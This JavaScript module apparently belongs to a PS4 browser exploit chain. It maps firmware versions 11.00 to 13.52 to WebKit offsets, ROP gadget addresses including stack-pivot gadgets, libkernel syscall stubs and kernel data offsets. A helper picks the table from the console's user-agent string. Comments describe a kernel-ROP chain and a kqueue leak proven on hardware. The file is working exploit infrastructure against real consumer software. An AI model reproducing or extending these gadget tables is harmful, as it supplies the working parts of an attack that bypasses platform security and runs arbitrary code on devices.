// WebKit (userland) RVAs only — no kernel gadgets, stubs, or patch metadata.
// 13.50 pop RVAs inlined from webkit_gadgets_1350.js (no extra import — PS4 browser).

export const PS4 = {
    "13.00": {
        fw_status: "userland-only — proven on hardware (full chain)",
        wk_expm1_builtin:                 0x2586880,
        wk_JSFunction_m_function:         0x28,
        wk___imp___error:                 0x3cb8cc8,
        k__error:                         0x26420,
        wk_ArrayBuffer_m_impl:            0x10,
        wk_ArrayBuffer_m_contents_m_data: 0x10,
    },
    "13.50": {
        fw_status: "13.50 build target (arw-1350-1): prim + R/W proof. "
            + "webkit RVAs = proven 13.00 layout (expm1 0x2586880 family); "
            + "pop gadgets from webkit_gadgets_1350.js (radare2). "
            + "libkernel base resolved every run via 2e vtable vote "
            + "(k__error 0x26420 anchor + page-align). "
            + "jitshm_create/alias are libkernel exports on 13.52 "
            + "(0x510/0x530 per retail Suchi96 dump) but a full-band live scan "
            + "on 13.50 found NO 533/534 wrapper stubs (r10-form pattern, "
            + "73728 reads, 0 faults) — 13.50 does not export them at the "
            + "13.52 RVAs, so the chain treats them as kernel-ROP raw syscalls. "
            + "wk_parseint_native unknown on "
            + "13.50 → webkitBase derived via expm1 anchor.",
        wk_expm1_builtin:                 0x2586880,  /* 13.00-shared — HW-confirm expm1 on 13.50 */
        wk_JSFunction_m_function:         0x28,
        wk___imp___error:                 0x3cb8cc8,
        k__error:                         0x26420,
        wk_ArrayBuffer_m_impl:            0x10,
        wk_ArrayBuffer_m_contents_m_data: 0x10,
        wk_POP_RDI_RET:                     0x5c480,
        wk_POP_RSI_RET:                     0x6e45e,
        wk_POP_RDX_RET:                     0x12c5ba,
        wk_POP_RCX_RET:                     0x1bade,
        wk_POP_RAX_RET:                     0x10504,
        wk_POP_R8_RET:                      0x5c47f,
        wk_POP_R9_RET:                      0x9db883,
        wk_LEAVE_RET:                       0x182f7,
        /** Method-2 kernel RVA (exception to userland-only header): cross-version
         *  derivation — Scene-Collective 1300.c vs 1350.c prove 13.00≅13.50 kernel
         *  DATA RVAs byte-identical (.text shifts +0x20..+0x3D0 only), so the
         *  kl_lock slot sits at 13.00's RVA. slopkit 13.00: verified-on-hardware.
         *  Runtime self-check in chain_poops kqueue leak: kernelBase.low&0x3fff==0
         *  + klLock.hi==0xffffffff. NOT the 13.52 value (0xe6c60, kept in 13.52). */
        k_kl_lock:                        0xe6c20,
    },
    "12.50": {
        fw_status: "userland-only — UNTESTED; webkit RVAs from 12.50 module dump",
        wk_expm1_builtin:                 0x2585110,
        wk_JSFunction_m_function:         0x28,
        wk___imp___error:                 0x3cb4c48,
        k__error:                         0xd9d0,
        wk_ArrayBuffer_m_impl:            0x10,
        wk_ArrayBuffer_m_contents_m_data: 0x10,
    },
    "12.00": {
        fw_status: "userland-only — UNTESTED",
        wk_expm1_builtin:                 0x2585090,
        wk_JSFunction_m_function:         0x28,
        wk___imp___error:                 0x3cb4c48,
        k__error:                         0xd9d0,
        wk_ArrayBuffer_m_impl:            0x10,
        wk_ArrayBuffer_m_contents_m_data: 0x10,
    },
    "11.50": {
        fw_status: "userland-only — UNTESTED",
        wk_expm1_builtin:                 0x2587bd0,
        wk_JSFunction_m_function:         0x28,
        wk___imp___error:                 0x36e1c68,
        k__error:                         0x3370,
        wk_ArrayBuffer_m_impl:            0x10,
        wk_ArrayBuffer_m_contents_m_data: 0x10,
    },
    "11.00": {
        fw_status: "userland-only — UNTESTED",
        wk_expm1_builtin:                 0x2193f30,
        wk_JSFunction_m_function:         0x28,
        wk___imp___error:                 0x36e1c68,
        k__error:                         0x3370,
        wk_ArrayBuffer_m_impl:            0x10,
        wk_ArrayBuffer_m_contents_m_data: 0x10,
    },
};

PS4["12.02"] = Object.assign({}, PS4["12.00"], {
    alias_of: "12.00",
    fw_status: "userland-only — shares 12.00 webkit RVAs",
});
PS4["12.52"] = Object.assign({}, PS4["12.50"], {
    alias_of: "12.50",
    fw_status: "userland-only — shares 12.50 webkit RVAs (no 12.52 dump)",
});

// 13.52 libkernel_sys.sprx — firmware 13.52 (HW-confirmed via eboot GOT usleep anchor).
// lk_base = DEREF(GOT_usleep) - 0x013b20  (same RVAs in WebKit process)
const LIBKERNEL_1352 = {
    /** Primary anchor — libkernel_sys usleep entry RVA (13.52) */
    k_usleep:                           0x13b20,
    k__error:                           0x1bb0,
    k_open:                             0x148d0,
    k_close:                            0x14900,
    k_read:                             0x14870,
    k_write:                            0x148a0,
    k_stat:                             0x15310,
    k_pread:                            0x15460,
    k_pwrite:                           0x15490,
    k_lseek:                            0x154f0,
    k_unlink:                           0x14930,
    k_notify:                           0x19320,
    k_socket:                           0x45f0,
    k_connect:                          0xc990,
    k_connect_alt:                      0xc970,
    k_mmap:                             0x114e0,
    k_jitshm_create:                    0x510,
    k_jitshm_alias:                     0x530,
    /** WebKit libkernel_sys load base is 16KB-aligned (…000). Okage ps2emu …c30 is a different process. */
    /** Suchi dump: mov rax,20 @ +0x4f0 — fire ROP at +0xa (mov r10,rcx;syscall) */
    k_getpid_syscall:                   0x4fa,
    /** BillZaiD game process — trial only, verify before use */
    billzai_lk_base:                    "0x80a67c000",
    k_stubs: {
        20: 0x2cb70,
        24: 0x2d5e0,
    },
};

/** slopkit Collator.notify — 13.00 PS4 table + 13.52 k_notify; RE gd/gps on HW (?gd=&gps=) */
const NOTIFY_1352 = {
    wk_notify_hc: [0x56a58, 0x56ca0, 0x57ce8],
    wk_notify_gd: 0x1aca,  /* 13.52 dump — was 13.00 0x1d6fa (NOTIFY-GD-BAD on HW) */
    wk_gps: 0x3352238,
    wk_gpe: 0x1b860,
    wk_cls: 0x3352228,
    wk_cle: 0x274e0,
    wk_ers: 0x3352230,
    wk_ere: 0xf7d0,
    wk_parseint_native: 0x1ea18,
};

PS4["13.52"] = Object.assign({}, PS4["13.50"], LIBKERNEL_1352, NOTIFY_1352, {
    fw_status: "13.52 HW pop + pivot G0-G5 full poops (7/7). lk RVAs HW-confirmed 13.52 libkernel_sys",
    /** Low .text PLT stub RVAs — fill from ghidra_analysis/scripts/find_webkit_plt.py on poops dump */
    wk_plt_stack_chk_fail: null,
    wk_plt___error: null,
    wk_expm1_builtin:                 0xeb6350,
    wk_parseint_native:               0x1ea18,  /* slopkit-core nativeTarget — not expm1 */
    wk_JSFunction_m_function:         0x28,
    wk_POP_RDI_RET:                     0x4be55,
    wk_POP_RSI_RET:                     0x7acb3,
    wk_POP_RDX_RET:                     0x30b1e9,
    wk_POP_RCX_RET:                     0xeaf246,
    wk_POP_RAX_RET:                     0x3424a,
    wk_POP_R8_RET:                      0x5d185,
    wk_POP_R9_RET:                      0x9b288b,
    wk_LEAVE_RET:                       0xf195b,
    wk_MOV_QWORD_PTR_RDI_RAX_RET:       0x1f9bb,
    wk_MOV_RDI_RSI_30_CALL:             0x128f418,
    wk_POP_RAX_MOV_RAX_JMP_18:          0x6c84b3,
    wk_PUSH_RBP_MOV_RBP_RSP_10:         0x246750,
    wk_MOV_RDI_RAX_8_CALL_20:           0x487d2,
    wk_MOV_RDX_RAX_18_CALL_10:          0x7f35aa,
    wk_PUSH_RDX_POP_RSP_RET:            0x13ec77a,
    pivot_view_sp:                      0x38,
    /** G0 reads [rsi+0x30] — poops uses leakval+0; try ?hookoff=30 or N4 multi */
    pivot_hook_off:                     0x0,
    k_jmp_rsi: 0x4d6d0,
    k_kl_lock: 0xe6c60,
});

PS4["13.04"] = Object.assign({}, PS4["13.50"], {
    alias_of: "13.50",
    fw_status: "userland-only — shares 13.50 webkit (BinDiff to 13.04 if gadgets moved)",
});

export function offsetsFor(uaString) {
    const m = (uaString || "").match(/PlayStation\s+4[\/ ](\d+)\.(\d+)/);
    if (!m) return { key: null, off: null };

    const key = m[1] + "." + parseInt(m[2], 10).toString(10).padStart(2, "0");
    return { key, off: PS4[key] || null };
}

export function offsetsForKey(key) {
    return { key, off: PS4[key] || null };
}
